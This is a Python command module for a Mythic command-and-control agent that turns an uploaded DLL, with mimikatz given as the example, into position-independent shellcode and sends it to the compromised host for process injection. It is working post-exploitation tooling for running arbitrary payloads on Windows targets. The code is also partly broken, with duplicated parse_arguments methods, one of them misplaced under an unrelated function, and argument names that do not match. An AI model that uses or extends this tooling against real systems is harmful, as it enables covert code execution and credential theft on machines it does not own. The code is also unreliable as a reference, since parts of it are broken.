from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import logging, sys
from .utils.crystal_utilities import *
from .utils.bof_utilities import *

'''
    [BRIEF]
    
    This command is not designed to be used directly although it can be.
    It does the following:
        - Takes a Dynamic Link Library (PE) as input
        - Converts it to PIC with Crystal Palace linker
        - Checks if there is a Process Inject Kit registered
        - Sends PIC and Kit (optional) to Agent for injection
   
    [Input]: 
        - File (Dll)
    [Output]:
        - {typedlist} [bytes:shellcode_contents] Contents of PIC file
        - {typedlist} [bytes:kit_spawn_contents] Contents of Process Injection Kit BOF
'''

logging.basicConfig(level=logging.INFO)

class ExecuteDllArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="dll_name",
                cli_name="File",
                display_name="DLL",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Already existing Dynamic Link Library to execute (e.g. mimikatz.x64.dll)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
            CommandParameter(
                name="dll_file",
                display_name="New DLL",
                type=ParameterType.File,
                description="A new DLL to execute. After uploading once, you can just supply the -File parameter",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="New DLL", 
                        ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="dll_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the DLL.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New DLL", ui_position=2
                    ),
                ],
            ),
            
            
            # TODO - Add arguments for x64/x86, Method name (optional), Class name (optional)
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".dll"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require a DLL to execute.\n\tUsage: {}".format(
                    ExecuteDllCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])

def print_attributes(obj):
    for attr in dir(obj):
        if not attr.startswith("__"):  # Ignore built-in dunder methods
            try:
                logging.info(f"{attr}: {getattr(obj, attr)}")
            except Exception as e:
                logging.info(f"{attr}: [Error retrieving attribute] {e}")


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)
        pass
        
class ExecuteDllCommand(CoffCommandBase):
    cmd = "execute_dll"
    needs_admin = False
    help_cmd = "execute_dll -File [mimikatz.x64.dll]"
    description = "Execute a Dynamic Link Library as PIC. (e.g., execute_dll -File mimikatz.x64.dll"
    version = 1
    author = "@c0rnbread"
    attackmapping = []
    argument_class = ExecuteDllArguments
    attributes = CommandAttributes(
        builtin=False,
        dependencies=["inline_execute", "inject_shellcode"],        # Required for ProcessInjectKit
        supported_os=[ SupportedOS.Windows ],
        suggested_command=False
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            ######################################
            #                                    #
            #   Group (New DLL | Default)   #
            #                                    #
            ######################################
            groupName = taskData.args.get_parameter_group_name()
            
            if groupName == "New DLL":
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    AgentFileID=taskData.args.get_arg("dll_file")
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        pass
                    else:
                        raise Exception("Failed to find that file")
                else:
                    raise Exception("Error from Mythic trying to get file: " + str(file_resp.Error))
                
                # Set display parameters
                response.DisplayParams = "-File {} -Arguments {}".format(
                    file_resp.Files[0].Filename,
                    taskData.args.get_arg("dll_arguments")
                )
                
                taskData.args.add_arg("dll_name", file_resp.Files[0].Filename)
                taskData.args.remove_arg("dll_file")
            
            elif groupName == "Default":
                # We're trying to find an already existing file and use that
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename=taskData.args.get_arg("dll_name"),
                    LimitByCallback=False,
                    MaxResults=1
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        logging.info(f"Found existing DLL with File ID : {file_resp.Files[0].AgentFileId}")

                        taskData.args.remove_arg("dll_name")    # Don't need this anymore
                        
                        # Set display parameters
                        response.DisplayParams = "-File {} -Arguments {}".format(
                            file_resp.Files[0].Filename,
                            taskData.args.get_arg("dll_arguments")
                        )

                    elif len(file_resp.Files) == 0:
                        raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
                else:
                    raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))

            
            #
            # Convert DLL -> PIC with Crystal Palace linker
            #
            
            # TODO: Do something with DLL arguments (dll_arguments)
            
            shellcode_file_contents = await convert_dll_to_pic(file_resp.Files[0].AgentFileId)

            logging.info(f"Converted DLL to PIC. Size: {len(shellcode_file_contents)} bytes")

            # Create DLL shellcode stub in Mythic
            shellcode_file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(TaskID=taskData.Task.ID, FileContents=shellcode_file_contents, DeleteAfterFetch=True)
            )

            if shellcode_file_resp.Success:
                shellcode_file_uuid = shellcode_file_resp.AgentFileId
            else:
                raise Exception("Failed to register DLL PIC stub: " + shellcode_file_resp.Error)
            
            # Send subtask to inject shellcode
            subtask = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    taskData.Task.ID,
                    CommandName="inject_shellcode",
                    SubtaskCallbackFunction="coff_completion_callback",
                    Params=json.dumps({
                        "shellcode_file": shellcode_file_uuid,
                        "method": "default"
                    }),
                    Token=taskData.Task.TokenID,
                )
            )
            
            # Debugging
            # logging.info(taskData.args.to_json())
            
            return response

        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp